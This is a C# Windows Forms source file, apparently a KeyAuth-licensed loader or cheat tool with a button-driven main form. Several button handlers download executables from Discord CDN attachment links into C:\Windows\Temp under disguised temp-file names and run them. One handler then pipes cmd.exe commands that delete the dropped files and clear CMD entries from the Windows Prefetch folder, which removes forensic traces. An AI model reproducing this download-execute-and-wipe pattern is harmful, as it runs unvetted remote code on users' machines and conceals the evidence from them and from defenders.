using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyAuth
{
    public partial class Main : Form
    {
		/*
        * 
        * WATCH THIS VIDEO TO SETUP APPLICATION: https://www.youtube.com/watch?v=RfDTdiBq4_o
        * 
	     * READ HERE TO LEARN ABOUT KEYAUTH FUNCTIONS https://github.com/KeyAuth/KeyAuth-CSHARP-Example#keyauthapp-instance-definition
		 *
        */
        public Main()
        {
            InitializeComponent();
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }



        public static bool SubExist(string name, int len)
        {
            for (var i = 0; i < len; i++)
            {
                if (Login.KeyAuthApp.user_data.subscriptions[i].subscription == name)
                {
                    return true;
                }
            }
            return false;
        }
        public string expirydaysleft()
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            dtDateTime = dtDateTime.AddSeconds(long.Parse(Login.KeyAuthApp.user_data.subscriptions[0].expiry)).ToLocalTime();
            TimeSpan difference = dtDateTime - DateTime.Now;
            return Convert.ToString(difference.Days + " Days " + difference.Hours + " Hours Left");
        }

        public DateTime UnixTimeToDateTime(long unixtime)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            try
            {
                dtDateTime = dtDateTime.AddSeconds(unixtime).ToLocalTime();
            }
            catch
            {
                dtDateTime = DateTime.MaxValue;
            }
            return dtDateTime;
        }

        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
                WebClient webClient = new WebClient();
                string fileName8 = "C:\\Windows\\Temp\\nsa17EA.tmp.exe";
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/1121129631681085458/1136451551288905909/APPX.xio1546lszvs_bg5m1fbkyopb.tmp", fileName8);
            }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void siticoneRoundedButton2_Click(object sender, EventArgs e)
            {
                WebClient webClient = new WebClient();
                Process process = new Process();
            process.StartInfo = new ProcessStartInfo();
                Process.Start("C:\\Windows\\Temp\\nsa17EA.tmp.exe");
        }

        private void siticoneRoundedButton3_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process();;
            string fileName2 = "C:\\Windows\\Temp\\nse948.tmp.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1128125897099182083/1136455922064031744/nse948.tmp.exe", fileName2);
            Process.Start("C:\\Windows\\Temp\\nse948.tmp.exe");

            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = false,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                    standardInput.WriteLine("ping 1.1.1.1 - n 1 - w 3000 > Nul & Del / f / q  C:\\Windows\\Temp\\nsa17EA.tmp.exe");
                standardInput.WriteLine("ping 1.1.1.1 - n 1 - w 3000 > Nul & Del / f / q  C:\\Windows\\Temp\\09123-1487AL-NSY2BD0.tmp.cmd");
                standardInput.WriteLine("cd C:\\Windows\\Prefetch & Del CMD* ");
            }
            //await PutTaskDelay(500);
            //Thread.Sleep(3000);




            _ = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();
        }



        private void siticoneRoundedButton5_Click(object sender, EventArgs e)
        {
            userControl21.Visible = true;
            userControl11.Visible = false;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void userControl21_Load(object sender, EventArgs e)
        {

        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click_1(object sender, EventArgs e)
        {

        }

        private void key_Click(object sender, EventArgs e)
        {

        }

        private void Main_Load_1(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click_2(object sender, EventArgs e)
        {

        }


        private void siticoneRoundedGradientButton2_Click(object sender, EventArgs e)
        {
            userControl11.Visible = false;
            userControl21.Visible = true;
            siticoneRoundedGradientButton3.Visible = true;
            siticoneRoundedGradientButton1.Visible = false;
            siticoneRoundedGradientButton2.Visible = false;
        }

        private void siticoneRoundedGradientButton1_Click(object sender, EventArgs e)
        {
            userControl11.Visible = true;
            userControl21.Visible = false;
            siticoneRoundedGradientButton1.Visible = false;
            siticoneRoundedGradientButton2.Visible = false;
            siticoneRoundedGradientButton3.Visible = true;
        }

        private void siticoneRoundedGradientButton3_Click(object sender, EventArgs e)
        {
            userControl11.Visible = false;
            userControl21.Visible = false;
            siticoneRoundedGradientButton1.Visible = true;
            siticoneRoundedGradientButton2.Visible = true;
            siticoneRoundedGradientButton3.Visible = false;

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo();
            Process.Start("https://discord.gg/mylon");
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo();
            Process.Start("https://www.youtube.com/channel/UCiaT03-C-6gRsmIpj_Dtgnw");
        }
    }
}